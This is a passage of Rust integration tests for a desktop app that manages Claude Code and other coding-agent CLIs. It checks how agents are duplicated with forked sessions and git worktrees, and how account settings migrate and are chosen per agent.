    assert_eq!(sent.len(), 2, "{sent:?}");
    assert!(sent[1].ends_with(" | Quelle base de données ?"), "{sent:?}");

    // Errors back on: the crash tells its exit code.
    h.core.settings.write().notify_for.errors = true;
    h.core
        .send_message(&id, "crash".into(), vec![])
        .await
        .unwrap();
    h.wait_alerts(3).await;
    assert!(
        h.alerts()[2].ends_with(" | Erreur : Claude Code s'est arrêté (code 3)"),
        "{:?}",
        h.alerts()
    );
}

// ---------- copies of an agent ----------

/// What the conversation of a copy tells when its original had changes it had not committed.
fn uncommitted_notice(original: &str) -> String {
    format!("Les modifications non commitées de {original} ne sont pas dans cette copie.")
}

#[tokio::test]
async fn a_copy_shows_the_conversation_again_and_forks_its_session_leaving_the_original_as_it_is() {
    let h = harness("copy-plain");
    let (p, r) = h.project(false).await;
    let id = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    h.core.rename_agent(&id, "refacto-auth").await.unwrap();
    h.core
        .set_agent_options(
            &id,
            Some("opus".into()),
            Some("max".into()),
            Some("plan".into()),
        )
        .await
        .unwrap();
    h.turn(&id, "Premier").await;
    let original = h.agent(&id);
    let session = original.session_id.clone().unwrap();
    // The last entry of the turn it ran: where a copy forks its session.
    let entry = original.last_entry.clone().expect("its last entry");
    let items = h.items(&id);

    let copy = h.core.duplicate_agent(&id).await.unwrap().meta;
    assert_eq!(copy.fork_at.as_deref(), Some(entry.as_str()));
    assert_eq!(
        (copy.name.as_str(), copy.named, copy.project_id.as_str()),
        ("refacto-auth (copie)", true, p.id.as_str())
    );
    assert_eq!(
        (
            copy.model.as_str(),
            copy.effort.as_str(),
            copy.mode.as_str()
        ),
        ("opus", "max", "plan")
    );
    // Without a worktree: in the same folder.
    assert_eq!(copy.worktree.as_ref().map(|w| &w.path), None);
    assert_eq!(copy.cwd, original.cwd);
    assert_eq!(h.items(&copy.id), items);
    // Shown at once, as an agent the user made.
    assert_eq!(h.core.ui.read().selected_agent.get(&p.id), Some(&copy.id));
    let pinned = |argv: &[String]| {
        argv.windows(3).any(|w| {
            w[0] == format!("--resume={session}")
                && w[1] == "--fork-session"
                && w[2] == format!("--resume-session-at={entry}")
        })
    };
    // Started on a fork of the original's session where it was copied…
    h.core.ensure_process(&copy.id).await.unwrap();
    let argv = h.launches(&r).pop().unwrap();
    assert!(pinned(&argv), "{argv:?}");
    // Nothing to say of its folder: it is the original's. Only the shared memory (ESC-255).
    let told = argv
        .iter()
        .position(|a| a == "--append-system-prompt")
        .map(|i| argv[i + 1].clone());
    assert_eq!(
        told,
        Some(crate::memory::instruction(crate::i18n::Lang::Fr)),
        "{argv:?}"
    );
    // …and there still, the original having gone on meanwhile, at every start until its first turn.
    h.turn(&id, "Ensuite").await;
    assert_ne!(h.agent(&id).last_entry.as_deref(), Some(entry.as_str()));
    h.core.agent(&copy.id).unwrap().lock().meta.last_activity = 0;
    h.core.stop_idle_processes();
    h.wait("the copy stopped", |h| !h.alive(&copy.id)).await;
    h.core.ensure_process(&copy.id).await.unwrap();
    let argv = h.launches(&r).pop().unwrap();
    assert!(pinned(&argv), "{argv:?}");
    // Its first turn gives it a session of its own.
    h.turn(&copy.id, "Second").await;
    let copied = h.agent(&copy.id);
    assert!(
        copied.session_id.is_some() && copied.session_id.as_deref() != Some(session.as_str()),
        "{:?}",
        copied.session_id
    );
    assert_eq!((copied.fork_of, copied.fork_at), (None, None));
    // The original is as it was before its own next turn: its session, its name, its conversation.
    let after = h.agent(&id);
    assert_eq!(
        (after.session_id.as_deref(), after.name.as_str()),
        (Some(session.as_str()), "refacto-auth")
    );
    assert_eq!(h.items(&id)[..items.len()], items[..]);
}

#[tokio::test]
async fn a_copy_of_a_worktree_agent_has_its_own_from_the_current_commit_set_up_like_a_new_one() {
    let h = harness("copy-worktree");
    let (p, r) = h.project(true).await;
    ignore(&r, ".env");
    ignore(&r, "prepared.txt");
    std::fs::write(r.join(".env"), "SECRET=1\n").unwrap();
    h.set_worktree_steps(
        &p.id,
        vec![wt_step(
            r#"node -e "require('fs').writeFileSync('prepared.txt', process.env.ESCOUADE_BRANCH)""#,
            "",
        )],
        vec![],
    );
    let a = h.core.create_agent(&p.id, None).await.unwrap().meta;
    h.wait("the original set up", |h| h.view(&a.id).setup.is_none())
        .await;
    let wt = a.worktree.clone().unwrap();
    let dir = PathBuf::from(&wt.path);
    // Its work so far: a commit on its branch, then changes it did not commit.
    std::fs::write(dir.join("src").join("app.ts"), "const a = 2;\n").unwrap();
    git(&dir, &["commit", "-qam", "travail"]);
    let head = git(&dir, &["rev-parse", "HEAD"]);
    std::fs::write(dir.join("src").join("app.ts"), "const a = 3;\n").unwrap();
    std::fs::write(dir.join("brouillon.txt"), "b\n").unwrap();
    let items = h.items(&a.id);

    let copy = h.core.duplicate_agent(&a.id).await.unwrap().meta;
    assert_eq!(copy.name, "agent-1 (copie)");
    let cwt = copy.worktree.clone().unwrap();
    assert_eq!(
        (cwt.branch.as_str(), cwt.base_branch.as_str()),
        ("escouade/agent-1-copie", "main")
    );
    assert_ne!(cwt.path, wt.path);
    assert_eq!(copy.cwd, cwt.path);
    let cdir = PathBuf::from(&cwt.path);
    // From the original's current commit, without what it did not commit…
    assert_eq!(git(&cdir, &["rev-parse", "HEAD"]), head);
    assert_eq!(
        std::fs::read_to_string(cdir.join("src").join("app.ts")).unwrap(),
        "const a = 2;\n"
    );
    assert!(!cdir.join("brouillon.txt").exists());
    // …which its conversation says, after the original's.
    let copied = h.items(&copy.id);
    assert_eq!(copied[..items.len()], items[..]);
    assert_eq!(copied[items.len()]["kind"], "notice");
    assert_eq!(copied[items.len()]["text"], uncommitted_notice("agent-1"));
    // Prepared as a new agent's: the files copied, then the setup run in it.
    assert_eq!(
        std::fs::read_to_string(cdir.join(".env")).unwrap(),
        "SECRET=1\n"
    );
    h.wait("the copy set up", |h| h.view(&copy.id).setup.is_none())
        .await;
    assert_eq!(
        std::fs::read_to_string(cdir.join("prepared.txt")).unwrap(),
        cwt.branch
    );
    // Its Claude is told at every start that it works in another folder than the one its
    // conversation names.
    let moved = format!(
        "Cette conversation a été copiée depuis un agent qui travaillait dans {}. Tu travailles maintenant dans {} : ne lis et n'écris que dedans.",
        wt.path, cwt.path
    );
    // Then what every agent is told of the shared memory (ESC-255).
    let moved = crate::core::with_memory(crate::i18n::Lang::Fr, Some(moved)).unwrap();
    assert_eq!(copy.append_prompt.as_deref(), Some(moved.as_str()));
    h.core.ensure_process(&copy.id).await.unwrap();
    let argv = h.launches(&cdir).pop().unwrap();
    assert!(
        argv.windows(2)
            .any(|w| w[0] == "--append-system-prompt" && w[1] == moved),
        "{argv:?}"
    );
    h.turn(&copy.id, "Bonjour").await;
    assert!(h
        .items(&copy.id)
        .iter()
        .any(|i| i["text"] == "Bonjour, tu as dit : Bonjour"));
    // The original is untouched: its branch, its changes.
    assert_eq!(git(&dir, &["rev-parse", "HEAD"]), head);
    assert!(dir.join("brouillon.txt").exists());

    // Everything committed: a second copy, with nothing to say of it.
    git(&dir, &["add", "-A"]);
    git(&dir, &["commit", "-qm", "suite"]);
    let second = h.core.duplicate_agent(&a.id).await.unwrap().meta;
    assert_eq!(second.name, "agent-1 (copie 2)");
    assert_eq!(second.worktree.unwrap().branch, "escouade/agent-1-copie-2");
    assert!(
        !h.items(&second.id)
            .iter()
            .any(|i| i["text"] == uncommitted_notice("agent-1")),
        "{:?}",
        h.items(&second.id)
    );
}

#[tokio::test]
async fn a_copy_is_told_where_it_works_in_the_language_of_the_texts_for_claude() {
    let h = harness("copy-worktree-en");
    let (p, _) = h.project(true).await;
    h.core.settings.write().claude_language = "en".into();
    let a = h.core.create_agent(&p.id, None).await.unwrap().meta;
    let copy = h.core.duplicate_agent(&a.id).await.unwrap().meta;
    let (from, to) = (a.worktree.unwrap().path, copy.worktree.unwrap().path);
    let moved = format!(
        "This conversation was copied from an agent that worked in {from}. You now work in {to}: only read and write in it."
    );
    let moved = crate::core::with_memory(crate::i18n::Lang::En, Some(moved)).unwrap();
    assert_eq!(copy.append_prompt.as_deref(), Some(moved.as_str()));
    // Its Claude reads it as the French one: an ordinary agent, no ticket's.
    h.turn(&copy.id, "Bonjour").await;
    let argv = h.launches(Path::new(&to)).pop().unwrap();
    assert!(
        argv.windows(2)
            .any(|w| w[0] == "--append-system-prompt" && w[1] == moved),
        "{argv:?}"
    );
    assert!(h
        .items(&copy.id)
        .iter()
        .any(|i| i["text"] == "Bonjour, tu as dit : Bonjour"));
}

#[tokio::test]
async fn an_agent_is_not_copied_during_its_turn() {
    let h = harness("copy-turn");
    let (p, r) = h.project(true).await;
    let worktrees = || git(&r, &["worktree", "list"]).lines().count();
    for (name, message, status) in [
        ("lent", "slow", AgentStatus::Running),
        ("curieux", "question", AgentStatus::Waiting),
    ] {
        let id = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
        h.core.rename_agent(&id, name).await.unwrap();
        h.core
            .send_message(&id, message.into(), vec![])
            .await
            .unwrap();
        h.wait("the turn", |h| h.agent(&id).status == status).await;
        let (agents, made) = (h.core.agents.read().len(), worktrees());
        let e = h.core.duplicate_agent(&id).await.unwrap_err();
        assert_eq!(
            e.to_string(),
            format!("Attends la fin du tour de {name} pour le dupliquer.")
        );
        assert_eq!((h.core.agents.read().len(), worktrees()), (agents, made));
    }
}

#[tokio::test]
async fn a_ticket_agent_is_copied_as_an_ordinary_agent() {
    let h = harness("copy-ticket");
    let (p, _) = h.project(false).await;
    let a = h
        .core
        .create_agent_with(
            &p.id,
            AgentOptions {
                name: Some("dem-1-ajouter".into()),
                worktree: Some(("ticket/dem-1".into(), "main".into())),
                append_prompt: Some("Protocole".into()),
                ticket_id: Some("t1".into()),
                port_base: Some(4100),
                ..Default::default()
            },
        )
        .await
        .unwrap()
        .meta;
    let copy = h.core.duplicate_agent(&a.id).await.unwrap().meta;
    assert_eq!(copy.name, "dem-1-ajouter (copie)");
    assert_eq!((copy.ticket_id.as_deref(), copy.port_base), (None, None));
    // Its own worktree from the ticket's branch, whose base it keeps.
    let wt = copy.worktree.unwrap();
    assert_eq!(
        (wt.branch.as_str(), wt.base_branch.as_str()),
        ("escouade/dem-1-ajouter-copie", "main")
    );
    // No ticket's protocol at its start: only what it is told of its new folder.
    h.core.ensure_process(&copy.id).await.unwrap();
    let argv = h.launches(Path::new(&wt.path)).pop().unwrap();
    let i = argv
        .iter()
        .position(|x| x == "--append-system-prompt")
        .unwrap();
    assert!(
        argv[i + 1].starts_with("Cette conversation a été copiée depuis un agent"),
        "{argv:?}"
    );
    assert!(!argv.iter().any(|x| x.contains("Protocole")), "{argv:?}");
    // The ticket's agent is still the original.
    assert_eq!(h.agent(&a.id).ticket_id.as_deref(), Some("t1"));
}

#[tokio::test]
async fn a_copy_of_a_copy_that_ran_no_turn_forks_where_the_first_was_made() {
    let h = harness("copy-of-copy");
    let (p, r) = h.project(false).await;
    let id = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    h.core.rename_agent(&id, "source").await.unwrap();
    h.turn(&id, "Premier").await;
    let original = h.agent(&id);
    let (session, entry) = (original.session_id.unwrap(), original.last_entry.unwrap());
    let copy = h.core.duplicate_agent(&id).await.unwrap().meta.id;
    // The original goes on, the copy has run no turn: it has no session of its own yet.
    h.turn(&id, "Ensuite").await;
    let second = h.core.duplicate_agent(&copy).await.unwrap().meta;
    assert_eq!(second.name, "source (copie) (copie)");
    assert_eq!(
        (second.fork_of.as_deref(), second.fork_at.as_deref()),
        (Some(session.as_str()), Some(entry.as_str()))
    );
    assert_eq!(h.items(&second.id), h.items(&copy));
    h.core.ensure_process(&second.id).await.unwrap();
    let argv = h.launches(&r).pop().unwrap();
    assert!(
        argv.windows(3).any(|w| w
            == [
                format!("--resume={session}"),
                "--fork-session".to_string(),
                format!("--resume-session-at={entry}")
            ]),
        "{argv:?}"
    );
}

#[tokio::test]
async fn a_copy_whose_fork_point_is_not_in_the_session_forks_all_of_it() {
    let h = harness("copy-unpinned");
    let (p, r) = h.project(false).await;
    let id = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    h.core.rename_agent(&id, "source").await.unwrap();
    h.turn(&id, "Premier").await;
    let session = h.agent(&id).session_id.unwrap();
    h.core.agent(&id).unwrap().lock().meta.last_entry = Some("missing-e1".into());
    let before = h.launches(&r).len();
    let copy = h.core.duplicate_agent(&id).await.unwrap().meta.id;
    // Its start refused, it is started again at once, on the whole session.
    h.wait("a second start", |h| h.launches(&r).len() == before + 2)
        .await;
    let launches = h.launches(&r);
    let [.., refused, forked] = &launches[..] else {
        panic!("{launches:?}")
    };
    assert!(
        refused.contains(&"--resume-session-at=missing-e1".to_string()),
        "{refused:?}"
    );
    assert!(
        forked
            .windows(2)
            .any(|w| w[0] == format!("--resume={session}") && w[1] == "--fork-session")
            && !forked.iter().any(|x| x.starts_with("--resume-session-at")),
        "{forked:?}"
    );
    // Its message goes to that process.
    h.turn(&copy, "Bonjour").await;
    assert_eq!(h.launches(&r).len(), before + 2);
    assert!(h
        .items(&copy)
        .iter()
        .any(|i| i["text"] == "Bonjour, tu as dit : Bonjour"));
    assert!(h
        .notices(&copy, "warn")
        .iter()
        .any(|n| n.starts_with("Point de copie introuvable")));
    assert_eq!(h.agent(&copy).fork_of, None);
}

#[tokio::test]
async fn a_copy_whose_original_session_is_gone_starts_a_new_one() {
    let h = harness("copy-lost");
    let (p, _) = h.project(false).await;
    let id = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    h.core.rename_agent(&id, "perdu").await.unwrap();
    h.core.agent(&id).unwrap().lock().meta.session_id = Some("missing-1".into());
    let copy = h.core.duplicate_agent(&id).await.unwrap().meta.id;
    h.turn(&copy, "Bonjour").await;
    let meta = h.agent(&copy);
    assert_eq!(meta.fork_of, None);
    assert!(
        meta.session_id
            .as_deref()
            .is_some_and(|s| s.starts_with("sess-")),
        "{:?}",
        meta.session_id
    );
    assert!(h
        .items(&copy)
        .iter()
        .any(|i| i["text"] == "Bonjour, tu as dit : Bonjour"));
}

#[tokio::test]
async fn a_long_conversation_is_copied_whole_in_one_append_per_item() {
    let h = harness("copy-long");
    let (p, _) = h.project(false).await;
    let id = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    // 2 000 messages, each logged as it was streamed: an append, then the patch of its text.
    let dir = h.core.data.conversations();
    let mut log = String::new();
    for i in 0..2000 {
        for op in [
            json!({ "op": "append", "item": { "kind": "text", "id": format!("m{i}"), "text": "", "streaming": true } }),
            json!({ "op": "patch", "id": format!("m{i}"), "patch": { "text": format!("réponse {i}"), "streaming": false } }),
        ] {
            log.push_str(&op.to_string());
            log.push('\n');
        }
    }
    std::fs::write(crate::conv::log_path(&dir, &id), log).unwrap();
    // Read from its log, as after a restart.
    h.core.agent(&id).unwrap().lock().conv = crate::conv::Conv::new(&dir, &id);
    let copy = h.core.duplicate_agent(&id).await.unwrap().meta.id;
    let copied = crate::conv::replay(&crate::conv::log_path(&dir, &copy)).unwrap();
    assert_eq!((copied.items.len(), copied.ops), (2000, 2000));
    assert_eq!(copied.items[1999]["text"], "réponse 1999");
    assert_eq!(h.items(&copy), h.items(&id));
}

#[tokio::test]
async fn no_copy_is_made_when_its_worktree_cannot_be() {
    let h = harness("copy-no-worktree");
    let (p, _) = h.project(true).await;
    let a = h.core.create_agent(&p.id, None).await.unwrap().meta;
    // Its worktree's folder is gone: no commit to start the copy's from.
    let gone = h.dir.join("gone").to_string_lossy().to_string();
    if let Some(wt) = h.core.agent(&a.id).unwrap().lock().meta.worktree.as_mut() {
        wt.path = gone;
    }
    let logs = || {
        std::fs::read_dir(h.core.data.conversations())
            .unwrap()
            .count()
    };
    let (agents, before) = (h.core.agents.read().len(), logs());
    assert!(h.core.duplicate_agent(&a.id).await.is_err());
    // Neither an agent nor its conversation left behind.
    assert_eq!((h.core.agents.read().len(), logs()), (agents, before));
}

// ---------- Claude accounts ----------

/// A second Claude account, its folder in the test's, put after Principal in the settings.
pub(crate) fn second_account(h: &Harness) -> Account {
    let pro = Account {
        id: "pro".into(),
        name: "Pro".into(),
        config_dir: h.dir.join("claude-pro").to_string_lossy().into(),
        ..Default::default()
    };
    let mut s = h.core.settings.read().clone();
    s.accounts.push(pro.clone());
    h.core.save_settings(s).unwrap();
    pro
}

pub(crate) async fn agent_on(h: &Harness, project: &Project, account: &str) -> AgentMeta {
    h.core
        .create_agent_with(
            &project.id,
            AgentOptions {
                account: Some(account.into()),
                ..Default::default()
            },
        )
        .await
        .unwrap()
        .meta
}

/// The `CLAUDE_CONFIG_DIR` of each launch of the fake CLI in `cwd`, in order (null: none).
pub(crate) fn config_dirs(h: &Harness, cwd: &Path) -> Vec<Value> {
    h.launch_log(cwd)
        .iter()
        .map(|l| l["configDir"].clone())
        .collect()
}

/// The one-shot questions (`claude -p`, asked in the temporary folder) launched so far with
/// `config_dir` as their `CLAUDE_CONFIG_DIR`. Other tests ask theirs there too, each with its
/// own folder or none.
fn one_shots_with(config_dir: &str) -> usize {
    let tmp = std::env::temp_dir();
    // As the process started there reports it (macOS: /private/var, not /var).
    let tmp = if cfg!(windows) {
        tmp
    } else {
        tmp.canonicalize().unwrap()
    };
    let key: String = tmp
        .to_string_lossy()
        .trim_end_matches(['\\', '/'])
        .chars()
        .map(|c| if c.is_ascii_alphanumeric() { c } else { '_' })
        .collect();
    let file = std::env::temp_dir().join(format!("fake-claude-{key}.jsonl"));
    std::fs::read_to_string(file)
        .unwrap_or_default()
        .lines()
        // A line another test's CLI is writing may be cut.
        .filter_map(|l| serde_json::from_str::<Value>(l).ok())
        .filter(|l| {
            l["configDir"] == config_dir
                && l["argv"]
                    .as_array()
                    .is_some_and(|a| a.contains(&json!("-p")))
        })
        .count()
}

#[tokio::test]
async fn settings_saved_before_the_languages_stay_in_french_and_a_new_install_follows_the_system() {
    let load = |name: &str, settings: Option<&str>| {
        let dir = test_dir(name);
        let data = DataDir::new(dir.join("data"));
        data.ensure().unwrap();
        if let Some(text) = settings {
            std::fs::write(data.settings_file(), text).unwrap();
        }
        let app = mock_app();
        let (core, _rx) = Core::load(app.handle().clone(), data);
        let s = core.settings.read().clone();
        (s.language, s.claude_language)
    };
    let pair = |a: &str, b: &str| (a.to_string(), b.to_string());
    // A settings.json of 1.6, or older: no `language` key. The app was in French only, and the
    // user's system may be English: they must not find it turned English by the update.
    assert_eq!(
        load("fw-lang-old", Some(r#"{"claudePath":"","sound":false}"#)),
        pair("fr", "ui")
    );
    assert_eq!(load("fw-lang-old-empty", Some("{}")), pair("fr", "ui"));
    // Once the key is there, it is the user's: "system" included, and whatever Claude writes in.
    assert_eq!(
        load(
            "fw-lang-system",
            Some(r#"{"language":"system","claudeLanguage":"en"}"#)
        ),
        pair("system", "en")
    );
    assert_eq!(
        load(
            "fw-lang-en",
            Some(r#"{"language":"en","claudeLanguage":"ui"}"#)
        ),
        pair("en", "ui")
    );
    // A new install has no file: it follows the system.
    assert_eq!(load("fw-lang-new", None), pair("system", "ui"));
    // An unreadable one is a new install's (a copy of it is kept).
    assert_eq!(
        load("fw-lang-broken", Some("{ not json")),
        pair("system", "ui")
    );
}

/// A core on settings saved by 1.8.0 (`accounts_version` 0) and the state `state`, in the
/// folder `dir` (`test_dir`), whose `DIR` they may name.
fn core_saved_by_1_8_0(
    name: &str,
    settings: Value,
    state: Value,
) -> (Arc<Core<MockRuntime>>, PathBuf) {
    let dir = test_dir(name);
    let shown = serde_json::to_string(&dir.to_string_lossy()).unwrap();
    let shown = &shown[1..shown.len() - 1];
    let settings: Value =
        serde_json::from_str(&settings.to_string().replace("DIR", shown)).unwrap();
    let state: Value = serde_json::from_str(&state.to_string().replace("DIR", shown)).unwrap();
    let data = DataDir::new(dir.join("data"));
    data.ensure().unwrap();
    std::fs::write(data.settings_file(), settings.to_string()).unwrap();
    std::fs::write(data.state_file(), state.to_string()).unwrap();
    let app = mock_app();
    let (core, _rx) = Core::load(app.handle().clone(), data);
    // The app is not needed past the load: the core keeps its handle.
    std::mem::forget(app);
    (core, dir)
}

fn core_account_ids(core: &Core<MockRuntime>) -> Vec<String> {
    core.settings
        .read()
        .accounts
        .iter()
        .map(|a| a.id.clone())
        .collect()
}

#[tokio::test]
async fn settings_and_agents_saved_before_the_accounts_keep_principal_through_the_update() {
    // ESC-128: settings of before the accounts (none listed) and an agent of then (on Principal).
    let agent = json!({ "id": "a1", "projectId": "p1", "name": "ancien", "model": "sonnet",
                        "effort": "medium", "mode": "auto", "cwd": "/x", "sessionId": "s1" });
    let (core, _dir) = core_saved_by_1_8_0(
        "esc128-old-files",
        json!({ "claudePath": "", "sound": false, "defaultModel": "opus" }),
        json!({ "projects": [], "agents": [agent] }),
    );
    // Loaded as they are: no Principal made up.
    assert!(core.settings.read().accounts.is_empty());
    assert_eq!(core.agent("a1").unwrap().lock().meta.account, "principal");
    // The update: Principal served (an agent runs on it), it stays, with the defaults of then.
    core.migrate_accounts().await;
    assert_eq!(core_account_ids(&core), ["principal"]);
    let s = core.settings.read().clone();
    assert_eq!(s.accounts_version, crate::accounts::ACCOUNTS_VERSION);
    assert_eq!(s.accounts[0].name, "Principal");
    assert_eq!(s.accounts[0].default_model, "opus");
    assert_eq!(core.agent("a1").unwrap().lock().meta.account, "principal");
    // In the file too, without the settings of then.
    let saved: Value =
        serde_json::from_slice(&std::fs::read(core.data.settings_file()).unwrap()).unwrap();
    assert_eq!(saved["accountsVersion"], 1);
    assert_eq!(saved["accounts"][0]["id"], "principal");
    assert!(saved.get("defaultModel").is_none());
}

#[tokio::test]
async fn the_update_drops_a_principal_never_signed_in_nor_used_and_keeps_the_others() {
    let (core, dir) = core_saved_by_1_8_0(
        "esc128-dropped",
        json!({ "accounts": [
            { "id": "principal", "name": "Principal" },
            { "id": "pro", "name": "Pro", "configDir": "DIR/pro" },
            { "id": "principal-codex", "name": "Principal", "engine": "codex" },
        ] }),
        json!({ "projects": [], "agents": [] }),
    );
    let _ = dir;
    core.migrate_accounts().await;
    assert_eq!(core_account_ids(&core), ["pro"]);
    // Brought once: a Principal added later stays, whatever it served.
    core.add_machine_account(EngineId::CODEX).unwrap();
    core.migrate_accounts().await;
    assert_eq!(core_account_ids(&core), ["pro", "principal-codex"]);
}

#[tokio::test]
async fn the_update_keeps_a_principal_that_served_in_the_statistics_or_a_project() {
    let (core, _dir) = core_saved_by_1_8_0(
        "esc128-served",
        json!({ "accounts": [
            { "id": "principal", "name": "Principal" },
            { "id": "principal-codex", "name": "Principal", "engine": "codex" },
            { "id": "principal-copilot", "name": "Principal", "engine": "copilot" },
        ] }),
        json!({ "projects": [{ "id": "p1", "name": "demo", "path": "DIR", "color": "#888",
                          "account": "principal-copilot" }],
                "agents": [] }),
    );
    // A message written on Codex's, long ago (its agent deleted since).
    core.stats
        .record_prompt("principal-codex", "codex", "gone", "p0");
    core.migrate_accounts().await;
    assert_eq!(
        core_account_ids(&core),
        ["principal-codex", "principal-copilot"]
    );
}

#[tokio::test]
async fn the_update_keeps_a_principal_signed_in_on_the_machine() {
    // The machine's home of this test: Codex signed in there (an API key), Copilot CLI not.
    let dir = test_dir("esc128-signed-in-home");
    std::fs::create_dir_all(dir.join(".codex")).unwrap();
    std::fs::write(
        dir.join(".codex").join("auth.json"),
        r#"{"OPENAI_API_KEY":"sk-test"}"#,
    )
    .unwrap();
    // nextest runs each test in a process of its own.
    std::env::set_var("ESCOUADE_TEST_REAL_HOME", &dir);
    let (core, _dir) = core_saved_by_1_8_0(
        "esc128-signed-in",
        json!({ "accounts": [
            { "id": "principal-codex", "name": "Principal", "engine": "codex" },
            { "id": "principal-copilot", "name": "Principal", "engine": "copilot" },
        ] }),
        json!({ "projects": [], "agents": [] }),
    );
    core.migrate_accounts().await;
    std::env::remove_var("ESCOUADE_TEST_REAL_HOME");
    assert_eq!(core_account_ids(&core), ["principal-codex"]);
}

#[tokio::test]
async fn the_machines_account_or_a_new_one_is_added_and_the_machines_once() {
    // ESC-128: « Ajouter un compte… » on a first installation, where no harness has an account.
    let dir = test_dir("esc128-add-home");
    std::fs::create_dir_all(dir.join(".codex")).unwrap();
    std::fs::write(
        dir.join(".codex").join("auth.json"),
        r#"{"OPENAI_API_KEY":"sk-test"}"#,
    )
    .unwrap();
    std::env::set_var("ESCOUADE_TEST_REAL_HOME", &dir);
    let h = harness("esc128-add");
    h.core.remove_claude_account("principal").unwrap();
    assert!(h.core.settings.read().accounts.is_empty());
    let machine = h.core.machine_account(EngineId::CODEX).await;
    assert!(machine.connected && !machine.added && machine.signs_in);
    assert_eq!(PathBuf::from(&machine.dir), dir.join(".codex"));
    let added = h.core.add_machine_account(EngineId::CODEX).unwrap();
    assert_eq!(
        (added.id.as_str(), added.engine, added.config_dir.as_str()),
        ("principal-codex", EngineId::CODEX, "")
    );
    assert!(h.core.machine_account(EngineId::CODEX).await.added);
    assert!(h
        .core
        .add_machine_account(EngineId::CODEX)
        .unwrap_err()
        .to_string()
        .contains("déjà ajouté"));
    // Copilot CLI not signed in here: not offered (the window says so), a new account is.
    assert!(!h.core.machine_account(EngineId::COPILOT).await.connected);
    let made = h
        .core
        .create_account(
            EngineId::COPILOT,
            "Travail",
            &[],
            crate::accounts::ShareMode::Copy,
        )
        .unwrap();
    std::env::remove_var("ESCOUADE_TEST_REAL_HOME");
    assert!(!made.config_dir.is_empty());
    assert_eq!(core_account_ids(&h.core), ["principal-codex", "travail"]);
    // The window was told each one.
    assert!(h.events.lock().iter().any(|e| e["type"] == "accounts"));
}

#[tokio::test]
async fn without_an_account_of_its_harness_nothing_starts_and_the_window_is_told_why() {
    let h = harness("esc128-no-account");
    let (p, _) = h.project(false).await;
    h.core.remove_claude_account("principal").unwrap();
    let refused = h.core.create_agent(&p.id, None).await.unwrap_err();
    let no = refused
        .downcast_ref::<crate::accounts::NoAccount>()
        .expect("for want of an account");
    assert_eq!(no.engine, EngineId::CLAUDE);
    assert_eq!(
        refused.to_string(),
        "Aucun compte Claude Code : ajoute-en un dans Réglages › Comptes."
    );
    // Nor on another harness, never on Claude Code's in its place.
    let codex = h
        .core
        .create_agent_with(
            &p.id,
            AgentOptions {
                engine: Some(EngineId::CODEX),
                ..Default::default()
            },
        )
        .await
        .unwrap_err();
    assert_eq!(
        codex
            .downcast_ref::<crate::accounts::NoAccount>()
            .map(|n| n.engine),
        Some(EngineId::CODEX)
    );
}

#[tokio::test]
async fn an_agent_whose_account_is_gone_takes_another_of_its_harness_never_principal() {
    let h = harness("esc128-gone");
    let (p, _) = h.project(false).await;
    let pro = second_account(&h);
    let a = agent_on(&h, &p, "pro").await;
    // Its account gone (a state saved with an account removed since): the one a new agent of its
    // project goes to, Principal here, the only one left, as it serves the project.
    h.core.agent(&a.id).unwrap().lock().meta.account = "parti".into();
    h.turn(&a.id, "Bonjour").await;
    assert_eq!(h.agent(&a.id).account, "principal");
    // No account of its harness left: refused, with nothing started.
    let b = agent_on(&h, &p, "pro").await;
    let _ = pro;
    let mut s = h.core.settings.read().clone();
    s.accounts.retain(|a| a.id == "pro");
    s.accounts[0].engine = EngineId::CODEX;
    h.core.save_settings(s).unwrap();
    h.core.agent(&b.id).unwrap().lock().meta.account = "parti".into();
    let handle = h.core.agent(&b.id).unwrap();
    let refused = h.core.agent_account(&handle).unwrap_err();
    assert!(refused
        .downcast_ref::<crate::accounts::NoAccount>()
        .is_some());
    // It keeps its account until one is there: nothing was started for it.
    assert_eq!(h.agent(&b.id).account, "parti");
}

#[tokio::test]
async fn an_agent_on_a_second_account_runs_with_its_folder_and_one_on_principal_without() {
    let h = harness("accounts-launch");
    // Each agent in its worktree: each its own log of launches.
    let (p, r) = h.project(true).await;
    let pro = second_account(&h);
    let principal = h.core.create_agent(&p.id, None).await.unwrap().meta;
    assert_eq!(principal.account, "principal");
    h.turn(&principal.id, "Bonjour").await;
    assert_eq!(config_dirs(&h, Path::new(&principal.cwd)), [Value::Null]);
    let asked_before = one_shots_with(&pro.config_dir);
    let a = agent_on(&h, &p, "pro").await;
    assert_eq!(a.account, "pro");
    h.turn(&a.id, "Bonjour").await;
    assert_eq!(config_dirs(&h, Path::new(&a.cwd)), [json!(pro.config_dir)]);
    // Its name is asked of its account too.
    h.wait("its name", |h| h.agent(&a.id).named).await;
    assert_eq!(one_shots_with(&pro.config_dir), asked_before + 1);
    // Named once its branch is renamed: the worktree is done changing before its file is written.
    assert_ne!(
        h.agent(&a.id).worktree.unwrap().branch,
        a.worktree.as_ref().unwrap().branch
    );
    // So is the message of a direct commit of its changes.
    std::fs::write(
        Path::new(&a.cwd).join("src").join("app.ts"),
        "const a = 2;\n",
    )
    .unwrap();
    h.core
        .commit_propose(&p.id, Some(a.id.clone()), vec!["src/app.ts".into()])
        .await
        .unwrap();
    assert_eq!(one_shots_with(&pro.config_dir), asked_before + 2);
    // A question about no agent goes to Principal (here, the worktree commands read in the project).
    h.core.suggest_worktree_steps(&p.id).await.unwrap();
    assert_eq!(config_dirs(&h, &r).last(), Some(&Value::Null));
    // An account the settings do not know: Principal.
    let lost = agent_on(&h, &p, "parti").await;
    assert_eq!(lost.account, "principal");
}

#[tokio::test]
async fn an_agent_on_a_second_account_goes_through_the_proxy_with_its_folder() {
    let h = harness("accounts-proxy");
    let (p, r) = h.project(false).await;
    let pro = second_account(&h);
    h.core.settings.write().proxy_url = "http://proxy.corp:3128".into();
    let id = agent_on(&h, &p, "pro").await.id;
    h.turn(&id, "Bonjour").await;
    // Its folder is added to the network settings, neither taking the other's place.
    let last = h.launch_log(&r).last().cloned().unwrap();
    assert_eq!(
        (&last["proxy"], &last["configDir"]),
        (&json!("http://proxy.corp:3128"), &json!(pro.config_dir))
    );
}

#[tokio::test]
async fn every_claude_escouade_launches_has_its_own_update_turned_off() {
    let h = harness("no-autoupdater");
    let (p, r) = h.project(false).await;
    let pro = second_account(&h);
